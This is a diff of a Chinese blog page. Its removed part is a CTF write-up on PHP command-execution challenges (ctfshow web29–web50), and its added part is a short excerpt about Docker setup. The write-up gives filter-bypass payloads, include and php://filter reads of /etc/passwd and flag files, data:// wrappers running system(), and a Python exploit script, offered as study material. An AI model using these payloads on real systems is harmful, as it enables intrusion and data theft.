+绕过了eval和system等执行函数，我们可以使用data伪协议，data伪协议data:/ ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/acwing%E6%90%AD%E5%BB%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E7%9A%84%E4%BD%BF%E7%94%A8/" title="acwing搭建云服务器及docker的使用">acwing搭建云服务器及docker的使用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-15T10:37:39.327Z" title="发表于 2022-07-15 18:37:39">2022-07-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/linux/">linux</a></span></div><div class="content">搭建云服务器以下环境为Ubuntu20云平台作用
+关系
 
-</div>
-            
-                
-<div class="post">
+在租到的服务器上搭建docker类似于在服务器上又开了一台虚拟服务器，重新划分了一下服务器的房子
+docker的搭建原因：docker有很强的迁移性，例如从阿里云的服务器迁移到腾讯云时，使用docker可以很容易地迁移
+docker是非常独立的：可以在一个服务器上开任意多个docker
+未来的开发环境是在docker所在的第三层
 
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-                命令执行漏洞
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-07-18</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
 
-    
-        <div class="content">
-            <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a>常用绕过</h2><ol>
-<li>绕过php，flag等特殊字符：使用通配符</li>
-<li>绕过system等执行函数：使用反单引号</li>
-<li>过滤了. \ `等函数常用字符<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718153954.png">,但是没有过滤<strong>$和_</strong>,使用<strong>逃逸</strong>，c=eval($_GET[1])</li>
-<li>最nb的是可以使用URL编码进行绕过，因为服务器会自动解一层url编码，所以可以对过滤掉的字符进行一次url编码</li>
-<li>过滤了分号，最后一条语句可以不带分号，结束的标志为’?&gt;’,则我们可以将两条语句中间需要分号的位置替换为’?&gt;’,那么就可以使用两条语句</li>
-<li>过滤了分号和括号，则必须使用语言结构，echo print isset unset include require，使用include加上php过滤器实现</li>
-<li>文件包含题目：使用伪协议：data伪协议可以执行后面的php代码</li>
-<li>过滤掉了字符和数字：使用url编码去代替字符，如果可以使用或运算，即可通过或运算去取字符，web41</li>
-<li>如果是过滤掉了冒号，则是想要过滤掉使用伪协议的方法，那么我们可以先逃逸出去一个变量后再使用伪协议进行文件包含操作</li>
-<li>绕过了eval和system等执行函数，我们可以使用data伪协议，data伪协议data://text/plain,可以直接执行后面跟着的php代码</li>
-<li>如果不能直接访问flag.php，可以先使用mv flag.php 1.txt进行重命名之后再访问1.txt,从而cat到flag.php中的内容</li>
-<li>当遇到了黑洞问题，可以使用双写绕过，例如?c=ls;ls</li>
-<li>当遇到了黑洞问题，并且过滤了分号，可以使用&amp;&amp;来起到分号的分隔作用</li>
-<li>当过滤掉了空格，可以使用其它的URL编码后的空白符:<pre class="line-numbers language-none"><code class="language-none">空格 %26 +   tab水平制表符 %09 回车 %0a或%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><h3 id="cookie的概念"><a href="#cookie的概念" class="headerlink" title="cookie的概念"></a>cookie的概念</h3><ol>
-<li>cookie用于识别用户，cookie是服务器留在用户计算机中的小文件，每当相同的计算机通过浏览器请求页面时，它同时会发送cookie<h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3></li>
-<li>检查变量是否为空，还要检查变量是否已经设置/声明</li>
-<li>意味着必须声明，并且不为NULL，才能返回true</li>
-</ol>
-<h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><ol>
-<li>使用正则表达式对字符串中的“w3schools”执行不区分大小写的搜索：</li>
-<li>该函数返回是否在字符串中找到匹配项。preg_match()</li>
-<li>preg_match(pattern, input, matches, flags, offset)<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718145036.png"></li>
-</ol>
-<h3 id="php中的通配符"><a href="#php中的通配符" class="headerlink" title="php中的通配符"></a>php中的通配符</h3><ol>
-<li>和Linux的通配符相同</li>
-<li>*可以代表任意个字符</li>
-<li>？可以代表一个字符，对字符的数量有限制</li>
-</ol>
-<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><ol>
-<li>system($shell,$shell_return);</li>
-<li>函数的作用是执行内部的shell命令，并且在函数执行后，直接在终端窗口打印命令执行的结果</li>
-<li>函数的返回值是命令的执行结果的最后一行</li>
-</ol>
-<h3 id="cp-from-to"><a href="#cp-from-to" class="headerlink" title="cp(from , to);"></a>cp(from , to);</h3><ol>
-<li>同linux的cp命令</li>
-</ol>
-<h3 id="题"><a href="#题" class="headerlink" title="题"></a>题</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150508.png"></li>
-<li>get传参，传给变量c，在变量c中使用preg_match来匹配flag，如果没有flag，就执行变量c中的语句</li>
-<li>给c传值，用system函数产生回显<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150648.png">，可以解析并执行</li>
-<li>因为不能出现flag，所以使用<strong>cp命令</strong>给flag.php换个名字,<strong>这个地方cp是shell命令，并不是一个函数</strong>，所以没有类似于函数的传参形式</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718150936.png"></li>
-<li>直接在路径后面使用文件名称来访问<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151056.png"></li>
-</ol>
-<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><h3 id="反单引号"><a href="#反单引号" class="headerlink" title="反单引号"></a>反单引号</h3><ol>
-<li>反单引号在php中和system()函数相同，起到命令执行的作用<pre class="line-numbers language-none"><code class="language-none">&#96;cp flag.php 1.txt&#96;  &#x2F;&#x2F;这个地方是反单引号
-和
-system(&#39;cp flag.php 1.txt&#39;)  &#x2F;&#x2F;这个地方是单引号
-的作用是相同的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="题-1"><a href="#题-1" class="headerlink" title="题"></a>题</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151237.png"></li>
-<li>多了几个过滤</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718151852.png"></li>
-</ol>
-<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><h3 id="preg-match中的转义"><a href="#preg-match中的转义" class="headerlink" title="preg_match中的转义"></a>preg_match中的转义</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718152309.png"></li>
-<li>\后面的字符代表转义，例如： ‘\.’ 即为’.’</li>
-</ol>
-<h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><ol>
-<li>中间搭一个桥，使用超全局变量</li>
-</ol>
-<h3 id="题-2"><a href="#题-2" class="headerlink" title="题"></a>题</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220718152514.png"></li>
-<li>过滤了更多，对’和.都有过滤</li>
-<li>使用c=eval($_GET[1]);对c进行逃逸操作，这个变量1逃逸出去了，1不属于c,则变量1可以使用任何过滤掉的字符</li>
-<li>构造?c=eval($_GET[1]);&amp;1=system(‘cp flag.php 1.txt’);</li>
-<li>在<strong>路径后面直接加上/1.txt</strong>，就可以查看到flag.php中的内容了,但是不能在system()中拼接cat 1.txt</li>
-<li><strong>当有新文件产生时，直接在url后面拼接上新文件的名字</strong></li>
-<li><strong>system()函数中传参一定要加上单引号</strong>，system(‘ls’),system(‘cp xxx xxxx’)</li>
-</ol>
-<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><ol>
-<li>include语句获取指定文件中存在的所有文本/代码/标记，并将其<strong>复制</strong>到使用include语句的文件中<pre class="line-numbers language-none"><code class="language-none">include require<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>希望在报错时继续执行并且向用户显示输出，使用include语句，因为当include语句包含的文件不存在时，只是产生一个警告，但是脚本会继续执行</li>
-<li>而require引用的文件如果不存在，就会提示错误，并终止脚本的运行<pre class="line-numbers language-none"><code class="language-none">include &quot;header.htm&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>上面的header.htm中可以php语句，因为可以包含html静态文件，所以可以设计缓存机制，比如把一些页面分为几部分，有一些读取数据库耗费效率的部分可以缓存为html，然后通过include</li>
-<li>文件上传中include代码执行原理：<pre class="line-numbers language-php" data-language="php"><code class="language-php">$i=include 'abc.php';
-abc.php中源码为
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">return</span> <span class="token string double-quoted-string">"hello world"</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span>
-那么echo $i;如果include中引用的源码中使用了return，则返回return中的返回值，如果没有，则返回1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h3><ol>
-<li>大致方法为按照文件包含的方法去做</li>
-<li>空格绕过：使用url编码</li>
-<li>因为过滤了反单引号，可以使用include包含执行代码去绕过</li>
-<li>相当于是<strong>逃逸加上文件包含的传参方式</strong><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122127.png">，发现可以回显</li>
-<li>可以使用文件包含的原理来实现<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122230.png">，原理就是加上一个php的过滤器</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122336.png">，得到一串base64编码，解码即可获得flag<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220719122415.png"></li>
-</ol>
-<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><ol>
-<li>与web32中的方式一样，这次也可以使用require</li>
-<li>尝试?c=%0a$_GET[1]?&gt;&amp;1=/etc/passwd发现可以解析</li>
-<li>加上过滤器，php://filter/convert.base64-encode/resource=index.php，找flag.php即可得到base64编码，解码得到flag</li>
-</ol>
-<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><h3 id="isset-1"><a href="#isset-1" class="headerlink" title="isset()"></a>isset()</h3><pre class="line-numbers language-none"><code class="language-none">bool isset ( mixed $var [, mixed $... ] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ol>
-<li>用于检测变量是否已经设置，并且不为NULL</li>
-<li>如果一次传入多个参数，那么isset()只有在全部参数<strong>都被设置</strong>时才会返回TRUE，计算过程从左到右，中途遇到没有设置的变量会立刻停止</li>
-<li>mixed $var为传入的变量</li>
-</ol>
-<h3 id="unset"><a href="#unset" class="headerlink" title="unset()"></a>unset()</h3><ol>
-<li>用于销毁给定的变量<pre class="line-numbers language-none"><code class="language-none">void unset ( mixed $var [, mixed $... ] )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>$var是要销毁的变量</li>
-</ol>
-<h3 id="题：-1"><a href="#题：-1" class="headerlink" title="题："></a>题：</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720094642.png">过滤了冒号，为了过滤php伪协议形式的命令</li>
-<li>分号和括号过滤，则只能使用语言结构，语言结构的函数：print echo isset unset include require</li>
-<li>对于?c=print%0a$_GET[1]?&gt;&amp;1=phpinfo();只能出现</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720154430.png"></li>
-<li>的字符：二进制数据段和代码段的区别关系，就是print没法像eval一样将字符当作php代码去执行</li>
-<li>使用include就可以使用文件包含的方式去实现命令执行</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720154643.png"></li>
-</ol>
-<h2 id="对于get传参时不加单引号的问题"><a href="#对于get传参时不加单引号的问题" class="headerlink" title="对于get传参时不加单引号的问题"></a>对于get传参时不加单引号的问题</h2><ol>
-<li>$_GET[1]和$_GET[‘1’]</li>
-<li>$_GET[1]不加单引号可以起到php向下兼容的作用，但是后面可能会随着php版本更新取消这种写法</li>
-<li>所以不确定php版本和是否被禁止，应该都试一遍</li>
-</ol>
-<h2 id="web37，文件包含"><a href="#web37，文件包含" class="headerlink" title="web37，文件包含"></a>web37，文件包含</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><ol>
-<li><a target="_blank" rel="noopener" href="https://strongwill.top/php%E4%BC%AA%E5%8D%8F%E8%AE%AE">https://strongwill.top/php伪协议</a></li>
-</ol>
-<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220720163511.png"></li>
-<li>发现是一个文件包含题目，考虑使用php伪协议</li>
-<li>对于要包含php执行代码的文件包含题目，使用data://text/plain,伪协议可以<strong>绕过过滤了eval等执行函数</strong>的情况<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>执行上面的函数发现可以执行，满足fopen和include都开启的条件，则后面的php执行代码可以操作<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>和过滤后缀的题目一样，重命名后再在路径后面直接添加1.txt即可访问到</li>
-<li><strong>有新文件产生在url后面拼接新文件的名字</strong></li>
-</ol>
-<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141702.png"></li>
-<li>发现还是一个文件包含题目，考虑使用php伪协议</li>
-<li>使用伪协议发现可以执行<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141821.png"></li>
-<li>继续执行将flag.php文件换名的操作，最后直接在URL后面加上新换名的文件即可查看到flag<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(&quot;cp fla?.??? 1.txt&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721142504.png"></li>
-<li>发现只是过滤了参数c中的”flag“字段，还是一个文件包含题目，考虑是使用伪协议</li>
-<li>按照上面的方式即可得到flag</li>
-</ol>
-<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol>
-<li>删除数组中的最后一个元素<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>其中array参数是必须的</li>
-<li>返回值：返回数组中的最后一个值，如果数组是空的，或者不是一个数组，将返回NULL</li>
-</ol>
-<h3 id="print-r"><a href="#print-r" class="headerlink" title="print_r()"></a>print_r()</h3><ol>
-<li>print_r()函数用于打印变量，以更容易理解的方式展示<pre class="line-numbers language-none"><code class="language-none">bool print_r(mixed $expression [,bool $return]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>$expression为要打印的变量，如果是string,integer,float则会打印变量值本身，如果是array类型，将会按照一定的格式显示键和元素</li>
-<li>$return:可选，如果为true，则不会输出结果，而是将返回值的结果赋值给一个变量，false则直接输出结果，默认为false<pre class="line-numbers language-none"><code class="language-none">
-&lt;?php
-$a &#x3D; array (&#39;a&#39; &#x3D;&gt; &#39;apple&#39;, &#39;b&#39; &#x3D;&gt; &#39;banana&#39;, &#39;c&#39; &#x3D;&gt; array (&#39;x&#39;,&#39;y&#39;,&#39;z&#39;));
-print_r ($a);
-?&gt;
-
-返回结果为
-Array
-(
-    [a] &#x3D;&gt; apple
-    [b] &#x3D;&gt; banana
-    [c] &#x3D;&gt; Array
-        (
-            [0] &#x3D;&gt; x
-            [1] &#x3D;&gt; y
-            [2] &#x3D;&gt; z
-        )
-
-)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">
-&lt;?php
-$b &#x3D; array (&#39;m&#39; &#x3D;&gt; &#39;monkey&#39;, &#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;x&#39; &#x3D;&gt; array (&#39;x&#39;, &#39;y&#39;, &#39;z&#39;));
-$results &#x3D; print_r ($b, true); &#x2F;&#x2F; $results 包含了 print_r 的输出结果
-?&gt;
-这个则没有返回值，因为输出结果赋值给了results变量，$return的参数值设置为了true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><ol>
-<li>next()函数将内部指针指向数组中的下一个元素，并输出</li>
-<li>返回值为内部指针指向的下一个元素的值</li>
-<li>next(array)内部参数为array，是一个数组</li>
-</ol>
-<h3 id="current"><a href="#current" class="headerlink" title="current()"></a>current()</h3><ol>
-<li>输出数组中当前内部指针指向的元素的值</li>
-<li>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</li>
-<li>该函数不会移动内部指针</li>
-</ol>
-<h3 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h3><h3 id="prev"><a href="#prev" class="headerlink" title="prev()"></a>prev()</h3><h3 id="reset"><a href="#reset" class="headerlink" title="reset()"></a>reset()</h3><h3 id="each"><a href="#each" class="headerlink" title="each()"></a>each()</h3><ol>
-<li>each()返回的不只是值，是键值对，并且将内部指针向前移动<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721145855.png"></li>
-</ol>
-<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><ol>
-<li>get_defined_vars()函数返回由所有已经定义的变量所组成的数组<pre class="line-numbers language-none"><code class="language-none">array get_defined_vars(void);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>返回值：返回一个包含所有已经定义变量列表的多维数组，这些变量包括环境变量，服务器变量，和用户定义的变量</li>
-</ol>
-<h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><ol>
-<li>因为不能用$,所以不能使用之前的逃逸字符来绕过</li>
-<li>考虑是否能通过打印变量，从变量中获取到信息<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;print_r(get_defined_vars());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150824.png"><br>发现是通过post给这个数组传参，尝试加一个post值</li>
-<li>post传参后回显<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150904.png"></li>
-<li>为了拿到array中的那个phpinfo()的字符串，rce一下，使用next函数将指针后移,并且形成了一个新的数组，这个数组的值为phpinfo(),键为它的键</li>
-<li>为了拿到指针指向的那个值，弹出array_pop()，将会返回数组中的最后一个值</li>
-</ol>
-<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="或运算取字符"><a href="#或运算取字符" class="headerlink" title="或运算取字符"></a>或运算取字符</h3><ol>
-<li>%40 | %01 可以取到A，或运算是两个都为0才为0，一个为1则为1</li>
-<li>计算机中保存URL编码是通过十六进制保存的<pre class="line-numbers language-none"><code class="language-none">%40的二进制为0100 0000
-%01的二进制为0000 0001
-取或得到     0100 0001
-结果从二进制转为十六进制，得到结果为65，转ascii码为A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="生成可用字符的脚本"><a href="#生成可用字符的脚本" class="headerlink" title="生成可用字符的脚本"></a>生成可用字符的脚本</h3><ol>
-<li>原理：从进行异或的字符中排除掉被过滤的，然后判断异或得到的字符是否为可见字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-$myfile &#x3D; fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);
-$contents&#x3D;&quot;&quot;;
-for ($i&#x3D;0; $i &lt; 256; $i++) &#123; 
-	for ($j&#x3D;0; $j &lt;256 ; $j++) &#123; 
-
-		if($i&lt;16)&#123;
-			$hex_i&#x3D;&#39;0&#39;.dechex($i);
-		&#125;
-		else&#123;
-			$hex_i&#x3D;dechex($i);
-		&#125;
-		if($j&lt;16)&#123;
-			$hex_j&#x3D;&#39;0&#39;.dechex($j);
-		&#125;
-		else&#123;
-			$hex_j&#x3D;dechex($j);
-		&#125;
-		$preg &#x3D; &#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;;
-		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
-					echo &quot;&quot;;
-    &#125;
-  
-		else&#123;
-		$a&#x3D;&#39;%&#39;.$hex_i;
-		$b&#x3D;&#39;%&#39;.$hex_j;
-		$c&#x3D;(urldecode($a)|urldecode($b));
-		if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;
-			$contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
-		&#125;
-	&#125;
-
-&#125;
-&#125;
-fwrite($myfile,$contents);
-fclose($myfile);
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="python脚本跑"><a href="#python脚本跑" class="headerlink" title="python脚本跑"></a>python脚本跑</h3><ol>
-<li>用法：python exp.py <url></li>
-<li>传递参数getflag<pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-
-import requests
-import urllib
-from sys import *
-import os
-os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行
-if(len(argv)!&#x3D;2):
-   print(&quot;&#x3D;&quot;*50)
-   print(&#39;USER：python exp.py &lt;url&gt;&#39;)
-   print(&quot;eg：  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)
-   print(&quot;&#x3D;&quot;*50)
-   exit(0)
-url&#x3D;argv[1]
-def action(arg):
-   s1&#x3D;&quot;&quot;
-   s2&#x3D;&quot;&quot;
-   for i in arg:
-       f&#x3D;open(&quot;rce_or.txt&quot;,&quot;r&quot;)
-       while True:
-           t&#x3D;f.readline()
-           if t&#x3D;&#x3D;&quot;&quot;:
-               break
-           if t[0]&#x3D;&#x3D;i:
-               #print(i)
-               s1+&#x3D;t[2:5]
-               s2+&#x3D;t[6:9]
-               break
-       f.close()
-   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;
-   return(output)
-   
-while True:
-   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))
-   data&#x3D;&#123;
-       &#39;c&#39;:urllib.parse.unquote(param)
-       &#125;
-   r&#x3D;requests.post(url,data&#x3D;data)
-   print(&quot;\n[*] result:\n&quot;+r.text)
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><ol>
-<li>过滤了$,+,-,^,~,使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字，但是特意留了个字符|，最重要的是没有过滤掉%,所以可以使用URL编码去解决问题<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721153703.png"></li>
-<li>可以从ASCII为0-255的字符中找到或运算能得到的可用的字符</li>
-<li>跑脚本吧，虽然最后我也没解出来，但是思路是对的</li>
-</ol>
-<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h3 id="黑洞"><a href="#黑洞" class="headerlink" title="黑洞"></a>黑洞</h3><ol>
-<li>‘&gt;/dev/null’命令</li>
-<li>目的是抑制各种命令输出的空设备<a target="_blank" rel="noopener" href="https://linuxhint.com/two-dev-null-command-purpose/">https://linuxhint.com/two-dev-null-command-purpose/</a><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729154309.png"></li>
-</ol>
-<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h3 id="过滤掉分号，但是还是需要两条命令的情况"><a href="#过滤掉分号，但是还是需要两条命令的情况" class="headerlink" title="过滤掉分号，但是还是需要两条命令的情况"></a>过滤掉分号，但是还是需要两条命令的情况</h3><ol>
-<li>过滤掉了分号，但是还是需要两条命令</li>
-<li>可以使用&amp;&amp;</li>
-<li>当前面的语句执行结果为true时，会执行后面的语句，而且前后是分割的两条命令</li>
-<li>遇到黑洞问题并且过滤掉了分号就可以用&amp;&amp;来起到分隔作用</li>
-<li>shell会执行第一个参数，将第二个参数带入到黑洞</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221013185128.png"><pre class="line-numbers language-none"><code class="language-none">if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;
-        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
-  &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729155254.png"></li>
-</ol>
-<h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><ol>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729160723.png"></li>
-<li>发现有黑洞，并且过滤掉了分号，我们可以使用&amp;&amp;对两条命令进行分隔，成为两条命令</li>
-<li>传参?c=ls&amp;&amp;ls ,并对&amp;&amp;进行URL编码，即传参?c=ls%26%26ls 可以查看到回显，那么我们可以修改第一条命令来得到flag，因为第二条命令进入了黑洞中<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220729160856.png"></li>
-<li>?c=tac flag.php%26%26ls得到flag</li>
-</ol>
-<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h3 id="当过滤掉数字和-时，URL编码中的数字不会被过滤"><a href="#当过滤掉数字和-时，URL编码中的数字不会被过滤" class="headerlink" title="当过滤掉数字和%时，URL编码中的数字不会被过滤"></a>当过滤掉数字和%时，URL编码中的数字不会被过滤</h3><ol>
-<li>当过滤掉数字时，URL编码中的数字不会被过滤</li>
-<li>因为URL编码在上传的过程中已经被浏览器解了一次码了，传到服务器的时候已经是字符而不是URL编码的数字了</li>
-<li>%同理</li>
-</ol>
-<h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><ol>
-<li>过滤掉了数字，$和*，即不让我们使用数字，逃逸和任意字符数的通配符</li>
-<li>我们可以使用?来代替*的通配符,URL编码中的数字会自动解码，不用担心</li>
-<li>?c=tac%09fla?.php%26%26ls</li>
-</ol>
-<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><ol>
-<li>shell特性：两个单引号分割字符串，中间执行会自动忽略</li>
-<li><strong>nl命令</strong>：将指定的文件添加行号标注后写到标准输出。如果不指定文件或指定文件为”-“ ，程序将从标准输入读取数据。</li>
-<li>nl [选项]… [文件]…</li>
-<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221013194449.png"></li>
-<li></li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
